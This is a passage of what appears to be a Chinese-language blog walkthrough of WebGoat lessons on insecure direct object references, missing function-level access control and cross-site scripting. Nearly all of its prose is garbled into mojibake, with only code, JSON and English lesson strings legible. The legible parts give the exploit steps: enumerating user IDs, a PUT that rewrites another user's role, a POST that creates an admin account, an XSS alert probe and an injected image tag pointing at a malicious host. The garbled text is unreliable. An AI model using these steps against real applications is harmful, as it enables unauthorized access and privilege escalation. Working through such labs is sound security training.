<p>ä»æ”»å‡»é¢çš„è§’åº¦æ¥çœ‹ï¼Œä¸€ä¸ªé‡è¦çš„åŸåˆ™æ˜¯å¯†åˆ‡å…³æ³¨åº”ç”¨ç¨‹åºçš„åŸå§‹å“åº”ä¸ç”¨æˆ·å¯è§å†…å®¹ä¹‹é—´çš„å·®å¼‚ã€‚è¿™æ¶‰åŠåˆ°å¯¹åº”ç”¨ç¨‹åºçš„æ·±å…¥åˆ†æï¼ŒåŒ…æ‹¬è¯·æ±‚å’Œå“åº”çš„ç»“æ„ã€æ•°æ®ä¼ è¾“æ–¹å¼ä»¥åŠåº”ç”¨ç¨‹åºçš„é€»è¾‘æµç¨‹ã€‚</p>
</blockquote>
<p>å°±æ˜¯ä½ ç‚¹å‡»profileåªæœ‰ä¸‰ä¸ªæ•°æ®ï¼Œä½†æ˜¯å“åº”çš„ä¸æ­¢ä¸‰ä¸ªï¼Œç”¨burpæŠ“åŒ…å°±è¡Œï¼Œçœ‹è¿”å›çš„æ•°æ®</p>
<p>å¯ä»¥çŸ¥é“å¤šäº†<code>role,userId</code>(è®°å¾—ç”¨éƒ½å¥½éš”å¼€)</p>
<h4 id="4-8">4.</h4>
<p>é¢˜ç›®è¦æ±‚æˆ‘ä»¬ä»¥å¦ä¸€ç§æ–¹å¼æŸ¥çœ‹æ‚¨è‡ªå·±çš„ä¸ªäººèµ„æ–™</p>
<p>è¿™ä¸€é¢˜ç”¨çš„æ˜¯RESTful æ¨¡å¼</p>
<blockquote>
<p>RESTfulæ˜¯ä¸€ç§ç”¨äºè®¾è®¡ã€æ„å»ºå’Œäº¤ä»˜WebæœåŠ¡çš„æ¶æ„é£æ ¼ã€‚å®ƒåŸºäºHTTPåè®®ï¼Œå¹¶ä½¿ç”¨ä¸åŒçš„HTTPæ–¹æ³•ï¼ˆå¦‚GETã€POSTã€PUTã€DELETEç­‰ï¼‰æ¥æ‰§è¡Œä¸åŒçš„æ“ä½œã€‚</p>
<p>RESTful WebæœåŠ¡å…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p>
<ol>
<li>å®¢æˆ·ç«¯-æœåŠ¡å™¨æ¶æ„ï¼šå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´é€šè¿‡HTTPåè®®è¿›è¡Œé€šä¿¡ã€‚å®¢æˆ·ç«¯è´Ÿè´£å‘é€è¯·æ±‚å’Œæ¥æ”¶å“åº”ï¼Œè€ŒæœåŠ¡å™¨è´Ÿè´£å¤„ç†è¯·æ±‚å’Œè¿”å›å“åº”ã€‚</li>
<li>èµ„æºæ ‡è¯†ï¼šRESTful WebæœåŠ¡ä½¿ç”¨ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ï¼ˆURIï¼‰æ¥æ ‡è¯†èµ„æºã€‚ä¾‹å¦‚ï¼Œå¯¹äºä¸€ä¸ªç”¨æˆ·ï¼Œå¯ä»¥å°†å…¶æ ‡è¯†ä¸º<code>/users/123</code>ã€‚</li>
<li>èµ„æºçŠ¶æ€ï¼šæ¯ä¸ªèµ„æºéƒ½æœ‰ä¸€ä¸ªä¸ä¹‹å…³è”çš„çŠ¶æ€ï¼Œè¯¥çŠ¶æ€å¯ä»¥é€šè¿‡HTTPè¯·æ±‚æ¥ä¿®æ”¹ã€‚HTTPæ–¹æ³•ï¼ˆå¦‚GETã€POSTã€PUTã€DELETEç­‰ï¼‰å®šä¹‰äº†å¦‚ä½•é€šè¿‡URIæ ‡è¯†çš„èµ„æºæ¥ä¿®æ”¹çŠ¶æ€ã€‚</li>
<li>æ— çŠ¶æ€é€šä¿¡ï¼šRESTful WebæœåŠ¡éµå¾ªæ— çŠ¶æ€é€šä¿¡åŸåˆ™ï¼Œè¿™æ„å‘³ç€æœåŠ¡å™¨ä¸ä¼šä¸ºæ¯ä¸ªè¯·æ±‚å­˜å‚¨ä»»ä½•çŠ¶æ€ä¿¡æ¯ã€‚è¿™æœ‰åŠ©äºæé«˜æœåŠ¡çš„å¯ä¼¸ç¼©æ€§å’Œå¯é æ€§ã€‚</li>
<li>ç¼“å­˜ï¼šRESTful WebæœåŠ¡æ”¯æŒç¼“å­˜ï¼Œä»¥ä¾¿æé«˜æ€§èƒ½å’Œå‡å°‘ç½‘ç»œå»¶è¿Ÿã€‚å®¢æˆ·ç«¯å’Œä¸­é—´ä»¶å¯ä»¥ä½¿ç”¨HTTPç¼“å­˜å¤´æ¥ç¼“å­˜å“åº”ï¼Œå¹¶åœ¨åç»­è¯·æ±‚ä¸­é‡ç”¨å®ƒä»¬ã€‚</li>
<li>ç»Ÿä¸€æ¥å£ï¼šRESTful WebæœåŠ¡ä½¿ç”¨ç»Ÿä¸€çš„æ¥å£æ¥è®¿é—®èµ„æºã€‚è¿™æ„å‘³ç€å®¢æˆ·ç«¯å¯ä»¥ä½¿ç”¨ç›¸åŒçš„HTTPæ–¹æ³•ï¼ˆå¦‚GETã€POSTã€PUTã€DELETEç­‰ï¼‰æ¥è®¿é—®ä¸åŒçš„èµ„æºã€‚</li>
</ol>
<p>æ€»ä¹‹ï¼ŒRESTful WebæœåŠ¡æä¾›äº†ä¸€ç§ç®€å•ã€ä¸€è‡´å’Œå¯æ‰©å±•çš„æ–¹å¼æ¥æ„å»ºWebåº”ç”¨ç¨‹åºå’ŒæœåŠ¡ä¹‹é—´çš„é€šä¿¡ã€‚å®ƒå·²ç»æˆä¸ºç°ä»£Webå¼€å‘ä¸­çš„ä¸»æµæŠ€æœ¯ä¹‹ä¸€ã€‚</p>
</blockquote>
<p>çœ‹ä¸‹æç¤ºï¼šçœ‹çœ‹å‰é¢çš„é…ç½®æ–‡ä»¶è¯·æ±‚ï¼Œè¿™æ˜¯ç±»ä¼¼çš„</p>
<p>ä¸Šä¸€é¢˜çœ‹åˆ°äº†<code>get /WebGoat/IDOR/profile</code></p>
<p>è¿”å›çš„æ•°æ®</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;role&quot; : 3,</span><br><span class="line">  &quot;color&quot; : &quot;yellow&quot;,</span><br><span class="line">  &quot;size&quot; : &quot;small&quot;,</span><br><span class="line">  &quot;name&quot; : &quot;Tom Cat&quot;,</span><br><span class="line">  &quot;userId&quot; : &quot;2342384&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¯´æ˜è¯·æ±‚è·¯å¾„å¤§æ¦‚æ˜¯è¿™æ ·çš„</p>
<p>å†çœ‹ä¸‹æç¤ºè¯´ï¼šå°†æ‚¨çš„ ID é™„åŠ åˆ°ä¸Šä¸€ä¸ªè¯·æ±‚ï¼ˆå³ â€¦/profile/{yourId}ï¼‰</p>
<p>æˆ‘ä»¬å¡«å…¥<code>/WebGoat/IDOR/profile/2342384</code>å°±èƒ½è®¿é—®è‡ªå·±çš„æ•°æ®äº†</p>
<h4 id="5-10">5.</h4>
<blockquote>
<p>è¿™é¢˜æˆ‘éœ€è¦åæ§½ä¸€ä¸‹è‡ªå·±è‡ªæ‰¾èªæ˜ç”¨ä¸¤ä¸ªæµè§ˆå™¨ï¼Œä¸€ä¼šç”¨edgeç­”é¢˜ï¼Œä¸€ä¼šç”¨ç«ç‹ï¼Œå¯¼è‡´åœ¨åšç¬¬äº”é¢˜çš„æ—¶å€™ä¸ç®¡æˆ‘æ€ä¹ˆä¿®æ”¹è¯·æ±‚åŒ…è¿”å›çš„éƒ½æ˜¯é”™è¯¯500ğŸ˜­ï¼ŒèŠ±äº†æˆ‘ä¸€ä¸‹åˆæ‰¾é—®é¢˜ï¼Œæœ€åæ²¡åŠæ³•ç›´æ¥é‡å¼€ï¼Œåªç”¨ç«ç‹æ‰åšå‡ºæ¥çš„</p>
</blockquote>
<p>é¢˜ç›®ä¸»è¦çš„æ„æ€æ˜¯ç¬¬ä¸€ä¸ªæŒ‰é’®æ˜¯ç”¨æ¥å±•ç°ä¿¡æ¯çš„ï¼Œä½†æ˜¯å‘é€çš„è¯·æ±‚åŒ…æ˜¯%7BuserId%7Dï¼Œå³{userId}</p>
<p>è¯´æ˜æç¤ºæˆ‘ä»¬ç”¨idå»æ‰¾ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨2342384çœ‹ä¸€ä¸‹tomçš„ä¿¡æ¯</p>
<p>è¿”å›</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">again. You need to use the same method\\/URL you used to access your own profile via direct object reference</span><br></pre></td></tr></table></figure>
<p>çœ‹æç¤ºæ˜¯è¦æˆ‘ä»¬ä¸€ä¸ªä¸ªæ¨æ–­userIdï¼Œè¿™é‡Œå¯ä»¥ç”¨burpçˆ†ç ´ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä¸€ä¸ªä¸€ä¸ªåŠ </p>
<p>åä¹‹æœ€åå°±æ˜¯2342388</p>
<p>è¿”å›çš„json</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;lessonCompleted&quot;</span> <span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;feedback&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;Well done, you found someone else&#x27;s profile&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;output&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;&#123;role=3, color=brown, size=large, name=Buffalo Bill, userId=2342388&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;assignment&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;IDORViewOtherProfile&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;attemptWasMade&quot;</span> <span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>è¿™é‡ŒWebGoat8.2.2å‡ºäº†BUGï¼ŒæŸ¥æ‰¾åˆ°Buffaloåè¿™é¢˜ç›´æ¥å®Œæˆäº†ã€‚</p>
</blockquote>
<p>ç„¶åéœ€è¦æˆ‘ä»¬ä¿®æ”¹colorä¸ºredï¼Œå’Œä¿®æ”¹roleå˜å°ç‚¹</p>
<p>ç‚¹å‡»ç¬¬äºŒä¸ªæŒ‰é’®æ˜¯ç”¨æ¥ä¿®æ”¹ä¿¡æ¯çš„ï¼Œç‚¹å‡»åæŠ“åŒ…</p>
<p>ç”±é¢˜æ‰€çŸ¥ï¼Œè¿™ä¸ªè¯·æ±‚éµå¾ªRESTfulè§„åˆ™ã€‚</p>
<blockquote>
<p>RESTfulï¼šGETæŸ¥è¯¢ã€POSTæ–°å¢ã€PUTä¿®æ”¹ã€DELETEåˆ é™¤</p>
</blockquote>
<p>ï¼ˆ1ï¼‰è¯·æ±‚æ–¹æ³•ä»GETæ”¹ä¸ºPUT</p>
<p>ï¼ˆ2ï¼‰Content-typeæ”¹æˆapplication/json(å› ä¸ºéœ€è¦ä¼ è¾“ä¿®æ”¹çš„æ•°æ®ï¼Œä¿®æ”¹çš„æ•°æ®ç±»å‹æ˜¯json)</p>
<p>ï¼ˆ3ï¼‰è¯·æ±‚å†…å®¹ä¸­æ„é€ jsonæ ¼å¼çš„Buffalo Billçš„profileï¼Œæ ¹æ®é¢˜ç›®è¦æ±‚ï¼Œroleè¦è®¾ç½®ä¸ºæ¯”3å°çš„æ•°ï¼Œcolorè¦è®¾ç½®ä¸ºredã€‚</p>
<blockquote>
<p>{<br>
â€œroleâ€:â€œ1â€,<br>
â€œcolorâ€:â€œredâ€,<br>
â€œsizeâ€:â€œlargeâ€,<br>
â€œnameâ€:â€œBuffalo Billâ€,<br>
â€œuserIdâ€:â€œ2342388â€<br>
}</p>
</blockquote>
<p>å‘é€å°±è¡Œäº†</p>
<h4 id="6-7">6.</h4>
<p>è®²äº†å¦‚ä½•å®‰å…¨å¯¹è±¡å¼•ç”¨</p>
<h3 id="2-Missing-Function-Level-Access-Controlï¼ˆç¼ºå°‘åŠŸèƒ½çº§è®¿é—®æ§åˆ¶ï¼‰">2.Missing Function Level Access Controlï¼ˆç¼ºå°‘åŠŸèƒ½çº§è®¿é—®æ§åˆ¶ï¼‰</h3>
<h4 id="2-9">2.</h4>
<p>äººä»¬å¯ä»¥ä¾é  HTMLã€CSS æˆ– javascript æ¥éšè—ç”¨æˆ·é€šå¸¸ä¸ä¼šè®¿é—®çš„é“¾æ¥ã€‚ è¿‡å»æ›¾æœ‰è¿‡ç½‘ç»œè·¯ç”±å™¨è¯•å›¾åœ¨ UI ä¸­ä½¿ç”¨ javascript ä¿æŠ¤ï¼ˆéšè—ï¼‰ç®¡ç†åŠŸèƒ½çš„æƒ…å†µï¼š<a target="_blank" rel="noopener" href="https://www.wired.com/2009/10/routers-still-vulnerable%E3%80%82">https://www.wired.com/2009/10/routers-still-vulnerableã€‚</a></p>
<p>æŸ¥æ‰¾éšè—ç‰©å“<br>
é€šå¸¸æœ‰ä¸€äº›æç¤ºå¯ä»¥æŸ¥æ‰¾ UI æœªå…¬å¼€çš„åŠŸèƒ½â€¦</p>
<ul>
<li>
<p>HTML æˆ– javascript æ³¨é‡Š</p>
</li>
<li>
<p>æ³¨é‡Šæ‰çš„å…ƒç´ </p>
</li>
<li>
<p>é€šè¿‡ CSS æ§ä»¶/ç±»éšè—çš„é¡¹ç›®</p>
</li>
</ul>
<p>æ‚¨çš„ä½¿å‘½<br>
åœ¨ä¸‹é¢çš„èœå•ä¸­æ‰¾åˆ°æ”»å‡»è€…/æ¶æ„ç”¨æˆ·æ„Ÿå…´è¶£çš„ä¸¤ä¸ªä¸å¯è§èœå•é¡¹ï¼Œå¹¶æäº¤è¿™äº›èœå•é¡¹çš„æ ‡ç­¾ï¼ˆèœå•ä¸­ç›®å‰æ²¡æœ‰é“¾æ¥ï¼‰ã€‚</p>
<p>å°±æ˜¯f12æ…¢æ…¢æ‰¾å‘—ã€‚ã€‚ã€‚</p>
<p>æ‰¾åˆ°äº†ä¸¤ä¸ªä¸å¯ç”¨çš„é“¾æ¥</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;/users&quot;&gt;Users&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;/config&quot;&gt;Config&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>æŠŠUserså’ŒConfigå¡«å…¥å°±è¡Œäº†</p>
<h4 id="3-7">3.</h4>
<p>è¿™é¢˜æ˜¯è¦æ˜¯æ”¶é›†ç”¨æˆ·ä¿¡æ¯</p>
<p>åˆ©ç”¨ä¸Šä¸€é¢˜å¾—åˆ°çš„userå’Œconfig</p>
<p>ä¸Šä¸€é¡µä¸­æ‰¾åˆ°äº†é“¾æ¥/usersï¼Œä½†æ˜¯ç›´æ¥ç‚¹å‡»çš„è¯ï¼Œæ˜¯404 not found</p>
<p>å‰é¢å¾—åŠ ä¸Š/WebGoat/å³</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost:8080/WebGoat/users</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯ä¼šè¿”å›500é”™è¯¯</p>
<p>ä¸‹é¢æœ‰ä¸¤ä¸ªåšæ³•ï¼ˆå½“ç„¶æ˜¯æç¤ºé‡Œé¢è¯´çš„ã€‚ã€‚ã€‚ï¼‰</p>
<h5 id="1-ç®€å•åšæ³•">1.ç®€å•åšæ³•</h5>
<p>æŠ“åŒ…ååŠ ä¸Š</p>
<p>å¢åŠ è¯·æ±‚å¤´<code>Content-Type: application/json</code>çš„æ“ä½œä¹‹åé¡ºåˆ©æ‹¿åˆ°äº†hashã€‚ã€‚</p>
<p><s>ä½†æ˜¯è¿™å¤ªéš¾çŒœäº†æŠŠã€‚ã€‚ã€‚</s></p>
<h5 id="2-è¿›é˜¶åšæ³•">2.è¿›é˜¶åšæ³•</h5>
<p>show hintsè¿˜èƒ½çœ‹åˆ°ä¸€ç§å¤æ‚æ€è·¯ï¼Œç…§ç€è¿™ä¸ªæ€è·¯èµ°äº†ä¸€é</p>
<p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªadminæƒé™çš„ç”¨æˆ·ï¼Œéœ€è¦åš3å¤„ä¿®æ”¹ï¼š</p>
<p>ï¼ˆ1ï¼‰å¢åŠ è¯·æ±‚å¤´Content-Type: application/json</p>
<p>ï¼ˆ2ï¼‰è¯·æ±‚æ–¹æ³•æ”¹ä¸ºPOST</p>
<p>ï¼ˆ3ï¼‰å¢åŠ jsonæ ¼å¼çš„æ•°æ®ï¼š{â€œusernameâ€:â€œnewUser2â€,â€œpasswordâ€:â€œnewUser12â€,â€œroleâ€:â€œWEBGOAT_ADMINâ€}</p>
<p>ç„¶åè¿”å›ç™»å½•é¡µé¢ï¼Œç”¨è¿™ä¸ªè´¦å·å°±å¯ä»¥ç™»é™†äº†ï¼Œç„¶ååœ¨è¿™ä¸ªè´¦å·ä¸‹é‡å¤ç®€å•åšæ³•ï¼ˆå…¶å®å°±æ˜¯cooikeä¸ä¸€æ ·äº†ï¼‰</p>
<p>å°±èƒ½çœ‹åˆ°hashå€¼äº†</p>
<p>è¿™ä¸ªå¯¹è¿™é¢˜æ¥è¯´æ˜¯ç»•äº†ä¸ªåœˆå­ï¼Œå› ä¸ºæœ€åéƒ½å¾—ç»•å›ç®€å•åšæ³•ï¼Œå› ä¸ºåæ¥è¯•äº†ä¸€ä¸‹ï¼Œç”¨è‡ªå·±æœ¬æ¥çš„è´¦å·ä¹Ÿå¯ä»¥çœ‹åˆ°æ‰€æœ‰ç”¨æˆ·çš„ä¿¡æ¯ã€‚ã€‚~<s>ä½†æˆ–è®¸è¿™ç§æ€è·¯åœ¨æŸäº›ç°å®æƒ…å†µä¸‹æœ‰ç”¨å§</s></p>
<h2 id="8-Cross-Site-Scripting-XSS">8.Cross-Site Scripting(XSS)</h2>
<h3 id="1-5">1</h3>
<p>ä»‹ç»XSSï¼Œå³è„šæœ¬ï¼Œå½“å‰ç«¯æˆ–åç«¯æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œè¿‡æ»¤æ—¶ï¼Œjsè„šæœ¬ä¼šåœ¨æµè§ˆå™¨æ­£å¸¸æ‰§è¡Œï¼Œå¸¸è§çš„å±å®³ï¼š<br>
çªƒå–ä¼šè¯Cookie<br>
åˆ›å»ºè™šå‡è¯·æ±‚<br>
åœ¨é¡µé¢ä¸Šåˆ›å»ºè™šå‡å­—æ®µä»¥æ”¶é›†å‡­æ®<br>
å°†æ‚¨çš„é¡µé¢é‡å®šå‘åˆ°â€œä¸å‹å¥½â€ç«™ç‚¹<br>
åˆ›å»ºä¼ªè£…æˆæœ‰æ•ˆç”¨æˆ·çš„è¯·æ±‚<br>
çªƒå–æœºå¯†ä¿¡æ¯<br>
åœ¨æœ€ç»ˆç”¨æˆ·ç³»ç»Ÿä¸Šæ‰§è¡Œæ¶æ„ä»£ç ï¼ˆæ´»åŠ¨è„šæœ¬ï¼‰<br>
æ’å…¥æ¶æ„å’Œä¸é€‚å½“çš„å†…å®¹</p>
<h3 id="2-10">2</h3>
<p>æ ¹æ®é¢˜æ„ï¼ŒæŸ¥çœ‹WebGoatå†…å„ä¸ªç½‘é¡µå¯¹åº”çš„Cookieæ˜¯å¦éƒ½ä¸€æ ·ã€‚<br>
ï¼ˆ1ï¼‰F12æ‰“å¼€æ§åˆ¶å°<br>
è¾“å…¥JSå‘½ä»¤ï¼Œå›è½¦</p>
<p>ï¼ˆ2ï¼‰æµ‹è¯•æŸ¥çœ‹å…¶ä»–ç½‘é¡µ<br>
å‘ç°æ¯ä¸ªé€‰é¡¹å¡ä¸Šçš„Cookieéƒ½ç›¸åŒ</p>
<p>ï¼ˆ3ï¼‰å¡«å†™yes</p>
<h3 id="3-8">3.</h3>
<p>xssæœ€å¸¸è§çš„ä½ç½®</p>
<ul>
<li>
<p>å°†æœç´¢å­—ç¬¦ä¸²å›æ˜¾ç»™ç”¨æˆ·çš„æœç´¢å­—æ®µ</p>
</li>
<li>
<p>å›æ˜¾ç”¨æˆ·æ•°æ®çš„è¾“å…¥å­—æ®µ</p>
</li>
<li>
<p>è¿”å›ç”¨æˆ·æä¾›çš„æ–‡æœ¬çš„é”™è¯¯æ¶ˆæ¯</p>
</li>
<li>
<p>åŒ…å«ç”¨æˆ·æä¾›çš„æ•°æ®çš„éšè—å­—æ®µ</p>
</li>
<li>
<p>æ˜¾ç¤ºç”¨æˆ·æä¾›çš„æ•°æ®çš„ä»»ä½•é¡µé¢</p>
<ul>
<li>ç•™è¨€æ¿</li>
<li>è‡ªç”±æ ¼å¼æ³¨é‡Š</li>
</ul>
</li>
<li>
<p>HTTP æ ‡å¤´</p>
</li>
</ul>
<h3 id="4-9">4.</h3>
<p>æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦æ³¨æ„xss</p>
<p>XSS æ”»å‡»å¯èƒ½å¯¼è‡´</p>
<pre><code>çªƒå–ä¼šè¯ Cookie

åˆ›å»ºè™šå‡è¯·æ±‚

åœ¨é¡µé¢ä¸Šåˆ›å»º false å­—æ®µä»¥æ”¶é›†å‡­æ®

å°†æ‚¨çš„ç½‘é¡µé‡å®šå‘åˆ°â€œä¸å‹å¥½â€çš„ç½‘ç«™

åˆ›å»ºä¼ªè£…æˆæœ‰æ•ˆç”¨æˆ·çš„è¯·æ±‚

çªƒå–æœºå¯†ä¿¡æ¯

åœ¨æœ€ç»ˆç”¨æˆ·ç³»ç»Ÿä¸Šæ‰§è¡Œæ¶æ„ä»£ç ï¼ˆæ´»åŠ¨è„šæœ¬ï¼‰

æ’å…¥æ¶æ„å’Œä¸å½“å†…å®¹
	&lt;img src=&quot;http://malicious.site.com/image.jpg/&gt;
	&quot;&gt;GoodYear recommends buying BridgeStone tires...
</code></pre>
<p>XSS æ”»å‡»å¢åŠ äº†ç½‘ç»œé’“é±¼æ”»å‡»çš„æœ‰æ•ˆæ€§</p>
<pre><code>URL ä¸­ä½¿ç”¨äº†æœ‰æ•ˆçš„åŸŸ
</code></pre>
<h3 id="5-11">5.</h3>
<p>xssç±»å‹</p>
<p>åå°„å‹</p>
<pre><code>æ¥è‡ªç”¨æˆ·è¯·æ±‚çš„æ¶æ„å†…å®¹åœ¨ Web æµè§ˆå™¨ä¸­æ˜¾ç¤ºç»™ç”¨æˆ·

æ¶æ„å†…å®¹åœ¨æœåŠ¡å™¨å“åº”åå†™å…¥é¡µé¢

éœ€è¦ç¤¾ä¼šå·¥ç¨‹å­¦

ä½¿ç”¨ä»æµè§ˆå™¨ä¸­çš„ç”¨æˆ·ç»§æ‰¿çš„æµè§ˆå™¨æƒé™è¿è¡Œ
</code></pre>
<p>åŸºäº DOMï¼ˆä¹Ÿåæ˜ åœ¨æŠ€æœ¯ä¸Šï¼‰</p>
<pre><code>å®¢æˆ·ç«¯è„šæœ¬ä½¿ç”¨æ¥è‡ªç”¨æˆ·è¯·æ±‚çš„æ¶æ„å†…å®¹å°† HTML å†™å…¥å…¶è‡ªå·±çš„é¡µé¢

ä¸reflected XSSç›¸ä¼¼

ä½¿ç”¨ä»æµè§ˆå™¨ä¸­çš„ç”¨æˆ·ç»§æ‰¿çš„æµè§ˆå™¨æƒé™è¿è¡Œ
</code></pre>
<p>å­˜å‚¨æˆ–æŒä¹…åŒ–</p>
<pre><code>æ¶æ„å†…å®¹å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸Šï¼ˆåœ¨æ•°æ®åº“ã€æ–‡ä»¶ç³»ç»Ÿæˆ–å…¶ä»–å¯¹è±¡ä¸­ï¼‰ï¼Œç„¶åé€šè¿‡ Web æµè§ˆå™¨æ˜¾ç¤ºç»™ç”¨æˆ·

ä¸éœ€è¦ç¤¾ä¼šå·¥ç¨‹
</code></pre>
<h3 id="7-5">7.</h3>
<p>æ‰¾æ³¨å…¥ç‚¹</p>
<p>ä¸€ä¸ªä¸€ä¸ªè¯•å°±è¡Œäº†</p>
<p>åˆ†åˆ«åœ¨ä¸¤ä¸ªç©ºè¾“å…¥<code>alert(1)</code>,çœ‹è¿”å›çš„ç»“æœï¼Œ</p>
<p>ç»“æœæ˜¾ç¤ºç¬¬ä¸€ç©ºå­˜åœ¨xssæ¼æ´ï¼Œå³ä¸ä¼šè¿‡æ»¤éæ³•çš„è¾“å…¥</p>
<p>è¿™é‡Œæˆ‘ä»¬åœ¨ç¬¬äºŒç©ºè¾“å…¥</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>å°±è¡Œäº†ï¼Œå³è°ƒç”¨jsçš„å¼¹å‡ºçª—å£çš„åŠŸèƒ½</p>
<h3 id="9-4">9.</h3>
<p>åå°„å‹å’ŒåŸºäº DOM çš„ XSS</p>
<p>åŸºäº DOM çš„ XSS æ˜¯åå°„å‹ XSS çš„å¦ä¸€ç§å½¢å¼ã€‚ä¸¤è€…éƒ½æ˜¯é€šè¿‡å‘é€ä¸€ä¸ªé“¾æ¥æ¥è§¦å‘çš„ï¼Œè¯¥é“¾æ¥çš„è¾“å…¥å°†åæ˜ åˆ°æµè§ˆå™¨ã€‚ DOM å’Œâ€œä¼ ç»Ÿâ€åå°„å‹ XSS ä¹‹é—´çš„åŒºåˆ«åœ¨äºï¼Œä½¿ç”¨ DOM æ—¶ï¼Œæœ‰æ•ˆè´Ÿè½½æ°¸è¿œä¸ä¼šè¿›å…¥æœåŠ¡å™¨ã€‚ å®ƒåªä¼šç”±å®¢æˆ·ç«¯å¤„ç†ã€‚</p>
<pre><code>æ”»å‡»è€…å‘å—å®³è€…å‘é€æ¶æ„ URL

å—å®³è€…ç‚¹å‡»é“¾æ¥

è¯¥é“¾æ¥å¯èƒ½ä¼šåŠ è½½æ¶æ„ç½‘é¡µæˆ–ä»–ä»¬ä½¿ç”¨ï¼ˆå·²ç™»å½•ï¼Ÿï¼‰çš„ç½‘é¡µï¼Œè¯¥ç½‘é¡µå…·æœ‰æ˜“å—æ”»å‡»çš„è·¯ç”±/å¤„ç†ç¨‹åº

å¦‚æœå®ƒæ˜¯ä¸€ä¸ªæ¶æ„ç½‘é¡µï¼Œå®ƒå¯èƒ½ä¼šä½¿ç”¨è‡ªå·±çš„ JavaScript æ¥æ”»å‡»å¦ä¸€ä¸ªå…·æœ‰æ˜“å—æ”»å‡»çš„è·¯ç”±/å¤„ç†ç¨‹åºçš„é¡µé¢/URL

æ˜“å—æ”»å‡»çš„é¡µé¢å‘ˆç°æœ‰æ•ˆè´Ÿè½½ï¼Œå¹¶åœ¨è¯¥é¡µé¢/ç«™ç‚¹çš„ç”¨æˆ·ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œæ”»å‡»

æ”»å‡»è€…çš„æ¶æ„è„šæœ¬å¯èƒ½ä»¥æœ¬åœ°è´¦å·çš„æƒé™è¿è¡Œå‘½ä»¤
</code></pre>
<p>å—å®³è€…æ²¡æœ‰æ„è¯†åˆ°å‘ç”Ÿäº†æ”»å‡» â€¦ æ¶æ„æ”»å‡»è€…ä¸ä½¿ç”¨ <script>alertï¼ˆâ€˜xssâ€™ï¼‰&lt;/ script&gt;</p>
<h3 id="10-5">10.</h3>
<p>æ ¹æ®é¢˜æ„ï¼Œæˆ‘ä»¬è¦æ‰¾åˆ°ç•™åœ¨åº”ç”¨ç¨‹åºä¸­çš„testä»£ç çš„routeï¼Œæœç´¢jsè„šæœ¬ã€‚</p>
<p>è¿™åšé¢˜ä¹‹å‰æˆ‘ä»¬éœ€è¦çŸ¥é“jsé‡Œé¢çš„Backbone.Router</p>
<p><a target="_blank" rel="noopener" href="https://wizardforcel.gitbooks.io/backbone-js-doc-112/content/6.html">Backbone.Routerï¼ˆè·¯ç”±ï¼‰ | Backbone.js ä¸­æ–‡æ–‡æ¡£ 1.1.2 (gitbooks.io)</a></p>
<p>å®ƒé¢˜ç›®çš„æ¡ˆä¾‹å†™çš„å¾ˆæ¸…æ¥š</p>
<p>æŸ¥çœ‹æœ¬è¯¾çš„ URL â€¦ å®ƒåº”ç±»ä¼¼äº /WebGoat/start.mvc#lesson/CrossSiteScripting.lesson/9ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œâ€œåŸºæœ¬è·¯çº¿â€æ˜¯ï¼š å¼€å§‹.mvc#lesson/ ä¹‹åçš„ CrossSiteScripting.lesson/9 æ˜¯ç”± JavaScript è·¯ç”±å¤„ç†ç¨‹åºå¤„ç†çš„å‚æ•°ã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬éœ€è¦æ‰¾test code</p>
<p>å…ˆç”¨f12å»çœ‹è°ƒè¯•å™¨ä¸­çš„ï¼ˆæ¥æºï¼‰resourceï¼Œä¸€ä¸ªä¸€ä¸ªæ…¢æ…¢æ‰¾å°±èƒ½çœ‹åˆ°GoatRouterï¼Œé‡Œé¢æœ‰</p>
